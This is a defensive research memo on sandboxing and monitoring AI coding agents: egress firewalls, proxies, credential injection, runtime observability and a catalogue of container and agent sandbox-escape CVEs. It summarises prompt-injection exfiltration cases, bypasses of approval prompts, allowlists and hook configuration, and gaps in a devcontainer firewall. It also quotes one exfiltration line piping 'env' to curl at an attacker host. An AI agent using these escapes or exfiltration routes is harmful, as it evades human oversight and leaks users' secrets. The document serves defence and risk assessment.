# Track 4: Cross-cutting controls and observability for AI-agent sandboxes

Research date: 2026-09-29. Every factual claim carries an inline source. Where only secondary reporting was found, that is flagged. Statements marked **(inference)** are my own reasoning from the cited facts, not a claim made by a source.

---

## 1. Threat model: why egress matters more than FS isolation for many agent threats

### 1.1 The lethal trifecta (Willison, 16 Jun 2025)
- An agent that has **(1) access to private data, (2) exposure to untrusted content, and (3) the ability to communicate externally** can be tricked by an attacker "into accessing your private data and sending it to that attacker." https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
- Exfiltration vectors listed: HTTP requests to APIs or images, email, PR creation, any tool able to talk to the internet. MCP's "mix and match tools" approach makes the combination easy to assemble by accident. Guardrails claiming "95%" protection are called insufficient; the reliable defense is to avoid the combination. https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
- The same site keeps a running catalogue of real exfiltration attacks (M365 Copilot, GitHub MCP, GitLab Duo, ChatGPT, Amazon Q, etc.): https://simonwillison.net/tags/exfiltration-attacks/

### 1.2 Related frameworks
- **Agents Rule of Two (Meta AI, Oct 2025).** In one session an agent should have at most two of: [A] processing untrustworthy inputs, [B] access to sensitive systems or private data, [C] changing state or communicating externally. If it needs all three, it should not run autonomously and needs human-in-the-loop or equivalent validation. It is meant as a supplement to least privilege, not a substitute. https://ai.meta.com/blog/practical-ai-agent-security/
- **Design Patterns for Securing LLM Agents against Prompt Injections (paper, summarized 13 Jun 2025).** The patterns are Action-Selector, Plan-Then-Execute, LLM Map-Reduce, Dual LLM, Code-Then-Execute, and Context-Minimization. Core principle: "Once an LLM agent has ingested untrusted input, it must be constrained so that it is *impossible* for that input to trigger consequential actions." https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/

### 1.3 Exfiltration through *allowed* domains (allowlists are not enough)
- **Claude code interpreter / Claude Cowork via `api.anthropic.com`.** The default network allowlist included Anthropic's own API. A prompt injection makes the agent upload the files it can see to `https://api.anthropic.com/v1/files` using the *attacker's* API key, and the attacker downloads them later. Johann Rehberger found it first (Oct 2025) and PromptArmor rediscovered it in Claude Cowork (Jan 2026). https://simonwillison.net/2026/Jan/14/claude-cowork-exfiltrates-files/ (secondary summary with the 30MB-per-file detail: https://www.esecurityplanet.com/threats/hackers-turn-claude-ai-into-data-thief-with-new-attack/)
- **OpenAI Codex cloud internet access (Jun 2025).** Codex offers a default allowlist of about 71 "common dependency" domains. OpenAI's own docs warn that prompt injection, exfiltration of code or secrets, and malware inclusion remain possible. https://simonwillison.net/2025/Jun/3/codex-agent-internet-access/
- **GitHub MCP (May 2025).** A malicious public issue led an agent with a private-repo token to leak private repo data through a PR, and api.github.com was the allowed channel. https://simonwillison.net/2025/May/26/github-mcp-exploited/
- **Anthropic's own sandbox docs** state it plainly: "Allowing broad domains such as `github.com` can create paths for data exfiltration." Because the built-in proxy decides from the client-supplied hostname without inspecting TLS, sandboxed code "can potentially use domain fronting" to reach hosts outside the allowlist. https://code.claude.com/docs/en/sandboxing (Security limitations)

### 1.4 Why egress is the more important control **(inference, supported by sources)**
- Anthropic: "Without network isolation, a compromised agent could exfiltrate sensitive files like SSH keys; without filesystem isolation, a compromised agent could easily escape the sandbox and gain network access." You need both, but for the trifecta the damaging step is the outbound one. https://www.anthropic.com/engineering/claude-code-sandboxing
- A coding agent must be able to read the repo (private data) and the internet or issues (untrusted content). So leg 3 (egress) is usually the only leg an operator can actually remove. FS isolation protects the *host* from the agent. It does not protect the *repo, the secrets in env, or the API tokens the agent legitimately holds* from being sent out.
- Consequences: (a) default-deny egress, (b) keep allowlists narrow at the path or tenant level and not just the domain level (github.com, api.anthropic.com, pastebins and object storage are all "dual-use"), (c) keep secrets out of the sandbox (Section 3), (d) log egress at request level (Section 2.5).

---

## 2. Network egress control

### 2.1 iptables/ipset init-firewall (Anthropic Claude Code devcontainer)
Source: https://raw.githubusercontent.com/anthropics/claude-code/main/.devcontainer/init-firewall.sh and https://raw.githubusercontent.com/anthropics/claude-code/main/.devcontainer/devcontainer.json
- The container runs with `--cap-add=NET_ADMIN --cap-add=NET_RAW`, and `postStartCommand` runs `sudo /usr/local/bin/init-firewall.sh` (devcontainer.json).
- The script saves the Docker embedded-DNS NAT rules (127.0.0.11), flushes the tables, and restores only those rules.
- It builds an `ipset` (`hash:net`) from GitHub's `/meta` ranges (web+api+git, aggregated) plus `dig` A-record lookups for registry.npmjs.org, api.anthropic.com, sentry.io, statsig.com, the VS Code marketplace, and update hosts.
- It sets default `INPUT/OUTPUT DROP` and adds `-m set --match-set allowed-domains dst -j ACCEPT`, then `REJECT --reject-with icmp-admin-prohibited`.
- It self-tests: `curl https://example.com` must fail and `https://api.github.com/zen` must succeed.
- **Caveats visible in the script (inference from reading it):**
  - Outbound **UDP/53 to any destination** is allowed (`iptables -A OUTPUT -p udp --dport 53 -j ACCEPT`), so DNS tunneling and exfiltration to an attacker's authoritative server stay open.
  - Outbound **TCP/22 to any destination** is allowed (SSH/git+ssh), which is another generic exfil channel.
  - The whole host /24 is allowed both ways.
  - IPs are resolved **once at start**. CDN-hosted names drift, and any other tenant on the same IP (e.g. a shared CDN or GitHub Pages IPs in the GitHub ranges) is reachable.
  - Allowing all of GitHub's ranges permits pushing to *any* GitHub repo or gist. The trifecta channel stays open unless credentials are scoped (Section 3).
  - The agent user has sudo for the firewall script only. If the agent gained root with NET_ADMIN it could flush the rules. The capability is granted to the container itself.

### 2.2 Allowlisting HTTP(S) proxies
| Tool | Mode of control | Notes / source |
|---|---|---|
| **Stripe Smokescreen** | HTTP CONNECT proxy with per-role hostname ACLs; modes open / report / enforce | Resolves each hostname and refuses non-publicly-routable IPs (SSRF protection); CIDR allow/deny; clients identified by mTLS cert CN (customizable, e.g. OU); rate limiting; Prometheus metrics. https://github.com/stripe/smokescreen |
| **Squid** (peek-and-splice) | SNI-based allow/deny *without* decryption (`ssl_bump peek step1` then `splice`/`terminate`) or full TLS bump | `ssl::server_name` ACL can use the CONNECT URI, the client SNI, and the server cert subject. https://wiki.squid-cache.org/Features/SslPeekAndSplice |
| **mitmproxy** | TLS-intercepting; regular, transparent, WireGuard, local-capture, upstream, reverse, and SOCKS5 modes; Python addons for request-level policy and logging | https://docs.mitmproxy.org/stable/concepts/modes/ |
| **Envoy** dynamic forward proxy | L7 forward proxy with DNS cache | Envoy warns that DFP with untrusted clients is "subject to confused deputy attacks" (localhost, link-local, cloud metadata, private nets). Recommends a default-deny RBAC plus network restrictions. https://www.envoyproxy.io/docs/envoy/latest/configuration/http/http_filters/dynamic_forward_proxy_filter |
| **coder/httpjail** | Per-process jail. Linux "strong mode" uses a network namespace plus nftables to force traffic through a TLS-intercepting proxy, with JS, shell, or line-processor rules | Default-deny; blocks DNS exfil; experimental; "does **not** isolate the filesystem." https://github.com/coder/httpjail |
| **Claude Code built-in sandbox proxy** | Host-side HTTP + SOCKS proxy; allow decision on hostname; no TLS inspection by default; optional experimental `network.tlsTerminate`; can chain to a corporate proxy or a custom proxy (`httpProxyPort`, `socksProxyPort`) for TLS inspection | https://code.claude.com/docs/en/sandboxing |

**Hostname-only vs TLS-intercepting (inference plus the Anthropic doc).**
- SNI or CONNECT-hostname filtering is cheap and needs no CA in the sandbox. It is still vulnerable to domain fronting (Anthropic doc above) and cannot restrict paths or tenants, e.g. allowing `api.github.com` but only for repo X.
- TLS interception (mitmproxy, Squid bump, httpjail, Claude `tlsTerminate`) enables per-request policy, header and credential injection, and full request logs. The price is installing a CA in the sandbox, breaking pinned clients, and the proxy itself becoming a high-value component. Anthropic notes Go CLIs (gh, gcloud, terraform) can fail TLS under macOS Seatbelt with a MITM CA. https://code.claude.com/docs/en/sandboxing

### 2.3 DNS-based filtering
- Kubernetes-native DNS-aware policy: **Cilium `toFQDNs`** (`matchName`, `matchPattern`) works through an in-agent DNS proxy that learns the name-to-IP mapping. DNS to kube-dns must be allowed separately. `*.github.com` does not match `github.com`. A standalone DNS proxy (alpha) exists for HA. https://docs.cilium.io/en/stable/security/dns/
- Plain DNS-sinkhole filtering (Pi-hole/AdGuard style) only blocks resolution. **(inference)** It does nothing against hard-coded IPs, DoH, or DNS-tunnel exfil to allowed resolvers. Pair it with IP-level default-deny.

### 2.4 Kubernetes NetworkPolicy / Cilium
- Vanilla `NetworkPolicy` is L3/L4 only: pod or namespace selectors and ipBlocks. It has **no FQDN matching, no L7, and no logging**, and has "no effect" without a CNI that enforces it. https://kubernetes.io/docs/concepts/services-networking/network-policies/
- So FQDN egress for agent pods needs Cilium `toFQDNs` (above), or an egress-proxy pod with NetworkPolicy allowing only that proxy **(inference)**.

### 2.5 Homelab: Tailscale ACLs
- Once a policy is defined, Tailscale ACLs and grants are deny-by-default, and tags let you group devices, e.g. `tag:agent`. https://tailscale.com/kb/1018/acls
- **(inference)** Pattern: put the agent VM on the tailnet as `tag:agent` with no grants *from* it to other nodes, so it can't reach the NAS, Home Assistant, or other admin UIs. Tailscale does not do internet egress filtering by itself. Use a host firewall or proxy on the agent VM for that.

---

## 3. Credential handling: keep secrets out of the sandbox

### 3.1 Token-injecting egress proxy (the agent holds a placeholder)
- **Claude Code sandbox `mask`.** Sandboxed commands see a per-session sentinel. The sandbox proxy swaps in the real value only on requests to `injectHosts` (which must also be in `allowedDomains`). This needs `network.tlsTerminate`. It handles headers and bodies and re-signs AWS SigV4. For secrets in files it serves a sentinel copy on Linux/WSL2 and blocks the file on macOS. `mask`, `tlsTerminate`, and `allowPlaintextInject` are ignored if they come from repo `.claude/settings*.json`, so a malicious repo cannot redirect credentials. https://code.claude.com/docs/en/sandboxing
- **Claude Code on the web.** A custom proxy means git credentials and signing keys "are never inside the sandbox". The proxy authenticates with scoped credentials and validates git operations before attaching tokens. https://www.anthropic.com/engineering/claude-code-sandboxing
- **Docker Sandboxes.** A host HTTP/HTTPS proxy "looks up the matching credential on the host, and overwrites the auth header before forwarding". The sandbox sees only a sentinel. https://docs.docker.com/ai/sandboxes/security/credentials/
- **Deno Sandbox (3 Feb 2026).** Code sees a placeholder and "the real key materializes only when the sandbox makes an outbound request to an approved host". Firecracker-style microVMs with a VM-boundary egress allowlist. https://deno.com/blog/introducing-deno-sandbox
- **Fly.io `tokenizer`.** Clients encrypt secrets to the proxy's public key and send them in a `Proxy-Tokenizer` header. The proxy decrypts and injects. Each sealed secret can carry client-auth requirements and allowed destination hosts, since "if a client is fully compromised, the attacker could send encrypted secrets via tokenizer to a service that simply echoes back the request." Processors cover bearer tokens, OAuth2 client-credentials, and GCP JWT. https://github.com/superfly/tokenizer
- Others found (secondary, not deeply verified): Modal sidecar secret-injection proxy https://modal.com/docs/examples/sidecar_secrets_injection ; iron-proxy used by Hermes agent https://hermes-agent.nousresearch.com/docs/user-guide/egress/iron-proxy
- **Residual risk (inference).** Injection stops *theft of the secret*. It does not stop *misuse through the secret*, because the agent can still make authenticated calls to the allowed host (e.g. push to a public repo, upload to the attacker's account on an allowed SaaS). Combine it with scoped tokens and request-level policy.

### 3.2 Short-lived, scoped credentials
- **GitHub App installation tokens** expire after 1 hour. They can be narrowed with `repositories`/`repository_ids` (up to 500) and a `permissions` subset, and can never exceed the app's grant. https://docs.github.com/en/apps/creating-github-apps/authenticating-with-a-github-app/generating-an-installation-access-token-for-a-github-app
- **HashiCorp Vault dynamic secrets** (database engine as the example): credentials are generated per request with a lease/TTL and revoked automatically on expiry. Per-consumer credentials also improve audit attribution. https://developer.hashicorp.com/vault/docs/secrets/databases

### 3.3 MCP gateways
- **Docker MCP Gateway / MCP Toolkit.** A centralized proxy between clients and MCP servers. Each server runs in its own container, "restricted to 1 CPU" and "limited to 2 GB". No host filesystem access by default. Signed `mcp/` images with SBOMs. "Requests to and from tools that contain sensitive information such as secrets are blocked." Credentials are injected by the gateway, OAuth flows are built in, and there is call logging and tracing. https://docs.docker.com/ai/mcp-catalog-and-toolkit/toolkit/ , https://docs.docker.com/ai/mcp-catalog-and-toolkit/mcp-gateway/ , repo https://github.com/docker/mcp-gateway
- **(uncertain)** Specific CLI flags (`--block-network`, `--verify-signatures`, `--log-calls`, interceptors) were not confirmed from the fetched README text; see Dead ends.

---

## 4. Runtime security observability (host / kernel layer)

| Tool | Mechanism / layer | Sees | Enforces? | Source |
|---|---|---|---|---|
| **Falco** (CNCF) | Kernel driver (kmod or modern eBPF) syscall stream plus plugins (k8s audit, CloudTrail, Okta…) | syscalls, with container/k8s metadata | Detection only by default. Response via Falcosidekick or **Falco Talon** (e.g. terminate pod, tcpdump) | https://falco.org/docs/concepts/event-sources/ ; https://www.cncf.io/blog/2024/11/06/why-falcos-new-response-engine-is-a-game-changer-for-open-source-cloud-native-security/ |
| **Tetragon** (Cilium) | eBPF kprobes/tracepoints/LSM; "can hook into any function in the Linux kernel and filter on its arguments" | process exec, syscalls, file and network I/O; k8s-aware; runs standalone in Docker too | **Yes, in-kernel.** Override return value (syscalls and security hooks only) and Signal/SIGKILL. SIGKILL alone doesn't guarantee a `write()` didn't happen, so combine both | https://tetragon.io/docs/overview/ ; https://tetragon.io/docs/concepts/enforcement/ |
| **Tracee** (Aqua) | eBPF events plus behavioral signatures | syscalls, security events, forensic artifacts | Detection | https://github.com/aquasecurity/tracee |
| **osquery** | SQL over host state; `process_events` / `socket_events` via Audit, BPF, OpenBSM, or EndpointSecurity | exec, bind/connect | Detection | Must not run alongside auditd (they fight over the audit netlink socket). `socket_events` is off by default due to load. https://osquery.readthedocs.io/en/stable/deployment/process-auditing/ |
| **auditd** | Linux audit subsystem | syscall and file-watch audit records | Detection | (see osquery doc above for the conflict) |

### 4.1 Interaction with gVisor / Kata / Firecracker
- **gVisor.** The Sentry is a user-space application kernel that handles the workload's syscalls, so the host kernel does not see the application's syscalls directly. gVisor added **runtime monitoring**: "A monitoring process can connect to the gVisor sandbox and receive a stream of actions", serialized as protobuf over a UDS. It can resolve FDs to full paths and attach container IDs. "Falco supports monitoring applications running inside gVisor. All the Falco rules and tooling work seamlessly." https://gvisor.dev/blog/2022/08/01/threat-detection/
  - Falco setup: `falco --gvisor-generate-config`, then `falco --gvisor-config=... --gvisor-root=...`. Any runsc from 2023 on is compatible. https://falco.org/docs/event-sources/gvisor , https://gvisor.dev/docs/tutorials/falco
  - **(inference)** Tetragon/Tracee on the host see the runsc Sentry and Gofer processes' *host* syscalls (a restricted, seccomp-filtered set), not the guest application's syscalls. Only the gVisor-native stream gives app-level visibility.
- **Kata Containers / Firecracker microVMs.** Each sandbox has its own guest kernel. **(inference; no primary doc found that states it in these words)** Host-side eBPF/Falco/Tetragon see only the VMM process (QEMU, Cloud Hypervisor, or Firecracker plus its jailer) and its vhost/tap I/O. They do not see processes, files, or syscalls inside the guest. Visibility needs an in-guest agent (Falco/Tetragon/osquery in the guest kernel, exporting over vsock or network), or network-level observation at the tap device or egress proxy. Ant Group's AntCWPP combines Kata with "in-container eBPF", which suggests eBPF inside the sandbox rather than on the host. https://katacontainers.io/blog/kata-containers-ant-container-security-with-ebpf-whitepaper/
- **Practical consequence (inference).** The stronger the isolation boundary, the more you should rely on (a) the egress proxy as the single observation point for all network activity, and (b) agent-level telemetry (Section 5) for intent. Host kernel telemetry stays useful for detecting *escape attempts* (unexpected behaviour of the VMM or runsc processes).

### 4.2 Correlating agent intent with syscalls
- **AgentSight** (arXiv 2508.02736, Aug 2025) does "boundary tracing" with eBPF. It captures TLS-decrypted LLM traffic through SSL uprobes to get intent and kernel events to get effects, and correlates them causally across processes, with <3% overhead. It detects prompt injection, reasoning loops, and similar. https://arxiv.org/abs/2508.02736 ; code https://github.com/agent-sight/agentsight

---

## 5. Agent-level observability

### 5.1 OpenTelemetry GenAI semantic conventions
- The conventions have moved to a dedicated repo, https://github.com/open-telemetry/semantic-conventions-genai . They cover spans, metrics, and events for GenAI clients, **agent spans** (`invoke_agent`, `execute_tool`), **MCP**, and provider-specific conventions. Attributes include `gen_ai.operation.name` and `gen_ai.tool.name`. Content capture is opt-in. https://opentelemetry.io/docs/specs/semconv/gen-ai/
- Status: still **Development** (can change between releases). A secondary source says v1.41 (2026) added MCP conventions with span name `{mcp.method.name} {target}`, e.g. `tools/call get_invoice`. https://www.dash0.com/knowledge/opentelemetry-genai-semantic-conventions-explained (secondary)

### 5.2 Claude Code OTel telemetry
Source: https://code.claude.com/docs/en/monitoring-usage
- Enable with `CLAUDE_CODE_ENABLE_TELEMETRY=1`, then set `OTEL_METRICS_EXPORTER`, `OTEL_LOGS_EXPORTER`, and `OTEL_EXPORTER_OTLP_*`.
- Metrics: `claude_code.session.count`, `.token.usage`, `.cost.usage`, `.lines_of_code.count`, `.code_edit_tool.decision`, `.commit.count`, `.pull_request.count`, `.active_time.total`.
- Events: `claude_code.user_prompt`, `.tool_result`, `.tool_decision`, `.api_request`, `.api_error`, `.assistant_response`, `.api_refusal`.
- Correlation attributes: `session.id`, `prompt.id`, `event.sequence`, `tool_use_id`, `request_id`, `message.uuid`. Plus `user.email` and `organization.id`, and custom `OTEL_RESOURCE_ATTRIBUTES`.
- Privacy defaults: prompt text and responses are redacted unless `OTEL_LOG_USER_PROMPTS=1` / `OTEL_LOG_ASSISTANT_RESPONSES=1`. Tool parameters and commands require `OTEL_LOG_TOOL_DETAILS=1`. Tool output requires `OTEL_LOG_TOOL_CONTENT=1`.
- Traces (beta, `CLAUDE_CODE_ENHANCED_TELEMETRY_BETA=1`) have span tree `claude_code.interaction` → `llm_request` / `hook` / `tool` → `tool.blocked_on_user` / `tool.execution`.

### 5.3 Codex CLI OTel
- Configured with an `[otel]` table. Exporter is `otlp-http`, `otlp-grpc`, or `none`, and `log_user_prompt = false` by default. Events include `codex.conversation_starts`, `codex.api_request`, `codex.sse_event`, `codex.tool_decision`, and `codex.tool_result`. `[sandbox_workspace_write]` has network access off by default. https://learn.chatgpt.com/docs/config-file/config-advanced (redirected from developers.openai.com/codex/config-advanced)
- Codex also supports `allow_managed_hooks_only = true` in `requirements.toml`. https://github.com/openai/codex/blob/main/docs/config.md

### 5.4 Agent hooks as an audit and policy point (Claude Code)
Source: https://code.claude.com/docs/en/hooks
- Events include `PreToolUse` (can block), `PostToolUse`, `PostToolUseFailure`, `PermissionRequest`, `PermissionDenied`, `UserPromptSubmit`, `SessionStart`/`SessionEnd`, `SubagentStart`/`SubagentStop`, `ConfigChange`, `FileChanged`, and others.
- Stdin JSON carries `session_id`, `transcript_path`, `cwd`, `permission_mode`, `prompt_id`, and, for tool events, `tool_name`, `tool_input`, and `tool_use_id`.
- There are three ways to block: exit code 2, JSON `permissionDecision: "deny"`, or rewriting via `updatedInput`. HTTP hooks are limited by `allowedHttpHookUrls` / `allowedEnvVars`. `allowManagedHooksOnly` restricts to admin hooks. Project hooks run only after workspace trust is accepted.
- **Caveat (inference plus Section 6).** Hooks run in the agent's user context and project config is writable by the agent. Several 2026 escapes (CVE-2026-25725, Cursor CVE-2026-48124) *abused* hook config as the escape vector. Use managed or user-level hooks, and keep hook-config paths read-only inside the sandbox.

### 5.5 Session transcripts
- Claude Code gives every hook a `transcript_path` (JSONL). The OTel `message.uuid` links telemetry to transcript entries. https://code.claude.com/docs/en/hooks , https://code.claude.com/docs/en/monitoring-usage

### 5.6 LLM trace backends
- **Langfuse** accepts OTLP at `/api/public/otel` and "aims to be compliant with the OpenTelemetry GenAI semantic conventions". It can be self-hosted. MIT except `ee` folders. https://langfuse.com/docs/opentelemetry/get-started , https://github.com/langfuse/langfuse
- **Arize Phoenix** is built on OpenTelemetry/OpenInference and self-hostable (Docker, Helm). Elastic License 2.0. https://github.com/Arize-ai/phoenix

### 5.7 Correlation recipe (inference / design suggestion)
1. Tag each sandbox with a `session.id`-derived label: container label, cgroup, VM name, and proxy client identity (Smokescreen mTLS CN, or a per-session proxy credential).
2. PreToolUse hook: log `{session_id, prompt_id, tool_use_id, tool_input}` and, for Bash, export `TOOL_USE_ID` into the command env so child processes carry it. Falco/Tetragon can match env vars or process ancestry.
3. Egress proxy logs include the session identity. Join them to `tool_use_id` by time window and process tree.
4. Send everything to one OTLP collector. Agent traces go to Langfuse/Phoenix/Tempo, Falco/Tetragon go to a SIEM. Join on `session.id`.
5. With microVMs, rely on the proxy and in-guest agents (Section 4.1).

---

## 6. Escape and bypass vulnerabilities relevant to the risk calculus

### 6.1 Container runtime (shared-kernel boundary)
| CVE | Component | Summary | Fixed | Source |
|---|---|---|---|---|
| CVE-2024-21626 "Leaky Vessels" | runc 1.0.0-rc93–1.1.11 | Leaked fd to host `/sys/fs/cgroup` into `runc init`. `process.cwd=/proc/self/fd/7/` (e.g. via Dockerfile `WORKDIR`) gives host FS access; `runc exec` variants. CVSS 8.6. Published 31 Jan 2024 | 1.1.12 | https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv ; https://snyk.com/blog/cve-2024-21626-runc-process-cwd-container-breakout/ |
| CVE-2025-31133 | runc | maskedPaths race: replace `/dev/null` with a symlink so runc bind-mounts an attacker-chosen path, or delete it to bypass masking. Info leak, DoS, or escape. CVSS 7.3. 5 Nov 2025 | 1.2.8 / 1.3.3 / 1.4.0-rc.3 | https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2 |
| CVE-2025-52565 | runc ≥1.0.0-rc3 | `/dev/console` bind mount happens before protections, so an attacker gets write access to `/proc/sysrq-trigger` or `core_pattern` | same | https://github.com/opencontainers/runc/security/advisories/GHSA-qw9x-cqr3-wc7r |
| CVE-2025-52881 | runc (+ opencontainers/selinux ≤1.12.0) | Race redirects procfs writes, **bypassing LSM** (can even disable AppArmor/SELinux labels); escape or DoS | same (+ selinux 1.13.0) | https://github.com/opencontainers/runc/security/advisories/GHSA-cgrx-mc8f-2prm |

- Mitigations named in the 2025 advisories: user namespaces with host root unmapped, rootless runc, non-root plus `noNewPrivileges`, and default AppArmor (partial). SELinux is less effective. Avoid untrusted images and configs. https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2
- **Agent relevance (inference).** All four need a malicious *image or config*, or code running inside a container that is being `exec`'d into. An agent that can build or run arbitrary images (Docker socket access, `docker build` of an attacker Dockerfile) is squarely in scope.

### 6.2 NVIDIA Container Toolkit (GPU agents / local LLM hosts)
| CVE | Summary | Fixed | Source |
|---|---|---|---|
| CVE-2024-0132 (+ bypass CVE-2025-23359) | TOCTOU during GPU-library mounts; symlinks cause host `/` to be mounted into the container. Wiz estimated 33% of cloud envs affected. CDI mode not affected. Deep-dive published 11 Feb 2025 | 1.17.4 | https://wiz.io/blog/nvidia-ai-vulnerability-deep-dive-cve-2024-0132 ; https://thehackernews.com/2024/09/critical-nvidia-container-toolkit.html |
| CVE-2025-23266 "NVIDIAScape" (CVSS 9.0) | The `createContainer` OCI hook inherits container env, so `LD_PRELOAD` in the Dockerfile makes privileged `nvidia-ctk` load an attacker `.so`. A "three-line Dockerfile." Reported at Pwn2Own Berlin May 2025, disclosed 17 Jul 2025 | Toolkit 1.17.8 / GPU Operator 25.3.1 | https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape |

### 6.3 Host kernel (why shared-kernel sandboxes carry risk)
- **CVE-2026-43499 "GhostLock"**, disclosed 8 Jul 2026. A use-after-free in rtmutex/futex PI requeue that dates to Linux 2.6.39 (2011). LPE in about 5s at about 97% reliability, with a container-escape variant, no special privileges needed. Fixed in Linux 7.1. gVisor lists it among the kernel CVEs it defends against. (Secondary: https://doc.scalingo.com/security/bulletins/ssb-2026-003 , https://cyberinsider.com/ghostlock-flaw-survived-in-the-linux-kernel-code-for-15-years/ ; gVisor: https://gvisor.dev/security-track-record/)
- gVisor claims its architecture defended against **96%** of high-impact Linux kernel vulnerabilities in its tracking database (3% needed a gVisor patch, 1% had external mitigation). It tracked 28 such kernel vulns in 2025 and 26 in 2026 through Q3. https://gvisor.dev/security-track-record/

### 6.4 gVisor and Firecracker's own CVEs
- **gVisor CVE policy.** A CVE is assigned only if the issue crosses the sandbox boundary, the attacker doesn't control the sandbox config, and it is gVisor-specific. https://gvisor.dev/security/
- **CVE-2025-2713 (gVisor runsc)** is reported as a local privilege escalation / file-permission issue, CVSS 7.8 (secondary: https://releasealert.dev/cve/CVE-2025-2713). The primary advisory was not fetched; treat details as unverified.
- **CVE-2026-5747 (Firecracker 1.13.0–1.14.3, 1.15.0).** Out-of-bounds write in the virtio **PCI** transport. A guest root user who modifies virtio queue config registers after activation can crash the VMM or potentially execute code on the host. Host RCE needs extra preconditions (custom guest kernel or snapshot configs). CVSS 7.5. Fixed in 1.14.4 / 1.15.1, April 2026. https://www.suse.com/security/cve/CVE-2026-5747.html , https://cveawg.mitre.org/api/cve/CVE-2026-5747
- **(inference)** Both projects have very small escape histories compared with the shared kernel. The Firecracker bug sits in a newer, optional feature (PCI transport), so keeping to the minimal device model matters.

### 6.5 Coding-agent sandbox escapes and approval bypasses (2025–2026)
**Claude Code / Anthropic sandbox-runtime**
- CVE-2025-54794 (<0.2.111): path-restriction bypass through naive prefix matching. CVSS 7.7. Reported by Elad Beber (Cymulate). https://www.wiz.io/vulnerability-database/cve/cve-2025-54794
- CVE-2025-54795 (GHSA-x56v-x2h6-7j34): `echo` command-injection approval bypass. https://db.gcve.eu/vuln/CVE-2025-54795
- CVE-2025-58764 (GHSA-qxfv-fcpc-w36x, <1.0.105): `rg` parsing bypassed the confirmation prompt. https://advisories.gitlab.com/pkg/npm/@anthropic-ai/claude-code/CVE-2025-58764/
- GHSA-66m2-gx93-v996 (<1.0.120, Oct 2025): deny rules did not follow symlinks. (Reported via search results; https://archives-cert.univ-amu.fr/2025/certmsgVULN666)
- CVE-2025-64755 (GHSA-7mv8-j34q-vp7q, <2.0.31): `sed` parsing bypassed read-only validation, allowing arbitrary file write. https://advisories.gitlab.com/pkg/npm/@anthropic-ai/claude-code/CVE-2025-64755/
- CVE-2025-66479 (`@anthropic-ai/sandbox-runtime` <0.0.16, Dec 2025, low): **network sandbox not enforced when no allowed domains were configured.** GHSA-9gqj-5w7c-vx47. https://nvd.nist.gov/vuln/detail/CVE-2025-66479 , https://advisories.gitlab.com/npm/@anthropic-ai/sandbox-runtime/CVE-2025-66479/
- CVE-2026-25725 (GHSA-ff64-7w26-62rf, <2.1.2, CVSS 4.0 7.7): bubblewrap left `.claude/settings.json` writable when it did not exist at startup. Sandboxed code could create it with a `SessionStart` hook that ran **unsandboxed on next launch**. Cymulate calls this class "Configuration-Based Sandbox Escape" and reports Gemini CLI unresolved after 90+ days and Codex closed as informational. https://advisories.gitlab.com/npm/@anthropic-ai/claude-code/CVE-2026-25725/ ; https://cymulate.com/blog/the-race-to-ship-ai-tools-left-security-behind-part-1-sandbox-escape/ (3 May 2026)
- **SOCKS5 null-byte allowlist bypass** (v2.0.24–v2.1.89, fixed silently in v2.1.90 on 1 Apr 2026, no CVE). A hostname like `evil.com\0.google.com` matched a wildcard allowlist entry. Researcher Aonan Guan. **Secondary reporting only**: https://pasqualepillitteri.it/en/news/3035/claude-code-sandbox-bypass-socks5-credentials , https://penligent.ai/hackinglabs/claude-code-sandbox-bypass

**OpenAI Codex CLI**
- CVE-2025-59532 (GHSA-w5fx-fh39-j5rw, 0.2.0–0.38.0): a model-generated `cwd` became the sandbox writable root, allowing writes outside the workspace. CVSS v4 8.6. Fixed in 0.39.0. https://osv.dev/vulnerability/CVE-2025-59532
- "GitPwned" (fixed in 0.95.0): the safe-command allowlist trusted `git show/diff/log` by name. `--output` wrote `.git/config` and `--ext-diff`/`core.pager` gave RCE, with no approval and outside the sandbox. https://www.pillar.security/blog/gitpwned-allowlist-to-rce

**Google Gemini CLI**
- Tracebit (reported 27 Jun 2025, fixed in 0.1.14 on 25 Jul 2025). A prompt injection in README/GEMINI.md abused allowlist matching: after `grep` was approved, `grep ...; env | curl attacker` ran silently. https://bleepingcomputer.com/news/security/flaw-in-gemini-cli-ai-coding-assistant-allowed-stealthy-code-execution (secondary; Tracebit's own post was not fetched)

**Cross-vendor: Pillar Security "Week of Sandbox Escapes" (Jul 2026)** https://www.pillar.security/blog/the-week-of-sandbox-escapes ; press summary https://thenextweb.com/news/ai-coding-agents-sandbox-escapes-pillar
- Four failure patterns: denylists can't keep pace with the OS; workspace config acts as executable code; "safe" command lists trust names, not arguments; privileged local daemons (the **Docker socket**) sit outside the sandbox.
- Cursor: virtualenv interpreter run by the unsandboxed Python extension (GHSA-p9g2-cr55-cw9c); git metadata plus fsmonitor; workspace `.claude` hook config (CVE-2026-48124 / GHSA-pc9j-3qc2-95wv, fixed 3.0.0).
- Codex and Gemini CLI: Docker socket reachable (GHSA-v4xv-rqh3-w9mc).
- Antigravity: denylist Seatbelt profile and a VS Code task config the host later ran. Google downgraded both and did not patch.
- Also reported (secondary, unverified): Cursor "DuneSlide" CVE-2026-50548/50549 (Cato Networks). https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-coding-agent-sandbox-escapes-20260722-c/

**Takeaways for the risk calculus (inference)**
1. Most 2025–26 agent escapes were **policy-layer bugs** (parsers, allowlists, config writable from inside, path canonicalization, proxy hostname parsing), not kernel or VM escapes. OS-level sandboxes around the agent process fail through the *host-side agent harness*.
2. Anything the host later executes (hooks, `.vscode/tasks.json`, `.git/config`, venv interpreters, direnv, IDE extensions) is part of the attack surface. Mount those paths read-only or run the whole IDE and agent inside the VM.
3. Never expose `/var/run/docker.sock` to the sandbox (Anthropic doc: it "effectively grants access to the host system"). https://code.claude.com/docs/en/sandboxing
4. A network allowlist implemented inside the agent process can itself be bypassed (CVE-2025-66479, SOCKS5 null byte). A second, independent egress control at the VM, host, or network layer provides defense in depth.

---

## 7. Dead ends / uncertain
- **Claude Code SOCKS5 null-byte bypass:** no Anthropic advisory or researcher primary post was found; only secondary blogs (pasqualepillitteri.it, penligent.ai). Dates and version range (v2.0.24–v2.1.89, fixed v2.1.90) are from secondary sources.
